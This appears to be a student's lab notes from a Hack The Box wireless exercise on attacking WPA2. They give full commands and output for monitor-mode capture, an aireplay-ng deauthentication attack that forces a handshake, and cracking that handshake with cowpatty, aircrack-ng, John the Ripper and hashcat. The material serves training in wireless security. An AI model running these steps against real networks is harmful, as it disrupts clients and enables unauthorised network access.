## 1. Reconnaissance

We begin by enabling monitor mode on our wlan0 interface using airmon-ng.

```sh
3kjS@htb[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

```sh
3kjS@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WPA

21:58:02  Created capture file "WPA-01.cap".

 CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 80:2D:BF:FE:13:83  -47 100      471       10    0   1   54   WPA2 CCMP   PSK  HackTheBox                                                    

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 80:2D:BF:FE:13:83  8A:00:A9:9B:ED:1A  -29    1 - 5      0      656  EAPOL  HackTheBox
```
## 2. Handshake Capture

![](The%20Traditional%20WPA%20Password%20Attack-20260923-080549.png)

**By executing a deauthentication attack** on connected clients using `aireplay-ng`, it **forces them to reconnect to the access point**. This allows us to capture the **4-way handshake** using airodump-ng.

```sh
3kjS@htb[/htb]$ aireplay-ng -0 5 -a 80:2D:BF:FE:13:83 -c 8A:00:A9:9B:ED:1A wlan0mon
```
![](Screenshot%202026-09-23%20at%2008.09.09.png)

After initiating the deauthentication attack, the WPA handshake should appear in the `airodump-ng` output within a few seconds, indicating a successful capture.

```sh
3kjS@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WPA
```
![](Screenshot%202026-09-23%20at%2008.09.18.png)
## 3. Password Cracking
#### Using Cowpatty

[CowPatty](https://github.com/joswr1ght/cowpatty) is a tool commonly used to verify and crack WPA handshakes. To validate whether a proper handshake has been captured, we can use CowPatty in check mode with the `-c` flag, followed by the capture file using `-r`.

```sh
3kjS@htb[/htb]$ cowpatty -c -r WPA-01.cap cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com> Collected all necessary data to mount crack against WPA2/PSK passphrase.
```

The `-f` option specifies the wordlist, `-r` provides the path to the packet capture file, and `-s` defines the SSID:

```sh
3kjS@htb[/htb]$ cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s HackTheBox

cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.

The PSK is "<SNIP>".

18 passphrases tested in 0.06 seconds:  284.77 passphrases/second
```
#### Using Aircrack-ng

```sh
3kjS@htb[/htb]$ aircrack-ng WPA-01.cap -w /opt/wordlist.txt
```
![](Screenshot%202026-09-23%20at%2008.15.24.png)
#### Using John the Ripper

[John the Ripper](https://github.com/openwall/john) can also be used to recover WPA passphrases. However, since John requires a specific hash format, we must first extract and convert the necessary data from the `.cap` or `.pcap` file using [wpapcap2john](https://github.com/willstruggle/john/blob/master/wpapcap2john).

```sh
3kjS@htb[/htb]$ /opt/wpapcap2john wpa-Induction.pcap

File wpa-Induction.pcap: Radiotap headers stripped
Dumping M3/M2 at 5.655957 BSSID 00:0C:41:82:B2:55 ESSID 'Coherer' STA 00:0D:93:82:36:3A
Coherer:$WPAPSK$Coherer#..l/U<SNIP>::WPA2:verified:wpa-Induction.pcap

2 ESSIDS processed and 1 AP/STA pairs processed
1 handshakes written
```

We can then use the extracted hash with John the Ripper and a wordlist to begin cracking:

```sh
3kjS@htb[/htb]$ cat hash 

Coherer:$WPAPSK$Coherer#..l/U<SNIP>::WPA2:verified:wpa-Induction.pcap
```

```sh
3kjS@htb[/htb]$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=wpapsk
```
![](Screenshot%202026-09-23%20at%2008.16.52.png)

```sh
3kjS@htb[/htb]$ john hash  --show

Coherer:Induction:000d9382363a:000c4182b255:000c4182b255::WPA2:verified:wpa-Induction.pcap
```
#### Using Hashcat

To crack WPA/WPA2 passwords with [Hashcat](https://hashcat.net/hashcat/), we first need to extract the appropriate hash from a `.pcap` or `.pcapng` capture file into Hashcat's accepted format. [hcxpcapngtool](https://github.com/ZerBea/hcxtools) is the go-to utility to convert handshake captures into Hashcat-friendly format.

```sh
3kjS@htb[/htb]$ hcxpcapngtool -o hash wpa-Induction.pcap
```

We can then inspect the hash to verify that it's the format we expect.

```sh
3kjS@htb[/htb]$ cat hash

WPA*01*592da88096c461da246c69001e877f3d*000c4182b255*000d9382363a*436f6865726572***<SNNIP>
```

Finally, to crack the hash, we use the `-m 22000` option in Hashcat, followed by the hash file and the wordlist we want to use for the brute-force attack.

```sh
3kjS@htb[/htb]$ hashcat -m 22000 --force hash /opt/wordlist.txt
```

```sh
3kjS@htb[/htb]$ hashcat -m 22000 --force hash /opt/wordlist.txt --show

cf3b81c9764f573c0fe30d21b40540d1:d8d63deb29d5:a234e93dcc12:HTBWireless:<SNIP>
8d4a1324dffc596883d96a1296fcb0d1:d8d63deb29d5:a234e93dcc12:HTBWireless:<SNIP>
```
